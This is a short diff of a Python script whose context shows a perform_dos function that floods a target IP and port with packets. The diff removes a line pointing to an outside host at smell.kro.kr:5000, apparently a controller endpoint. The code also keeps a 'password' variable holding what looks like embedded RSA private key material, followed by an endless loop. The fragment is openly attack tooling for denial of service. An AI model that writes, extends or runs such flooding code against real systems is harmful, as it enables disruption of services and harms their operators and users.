@@ -25,7 +25,6 @@ def perform_dos(target_ip, target_port):
             print(f"Sent {packet_count} packets to {target_ip}:{target_port}")
             
             
-url = "http://smell.kro.kr:5000/objects"
 password = "MIICWgIBAAKBgFlFkeP2FFDGIbzyCK7YAmtl/xOsFN8+mm8Hk8XJfMo2ZMEaJvjrdusvHARo4oIU1OxtxNasU41MeSGg7xMurL6DRrEhB61qOKLydICyUX9w0dmS+r7kqTM9X4Ts+vwHBjBhIMYE8j7O5FUfSlVrCGUMFhEfxhvwehCO7Ijn8cgPAgMBAAEC"
 while True:
     try:
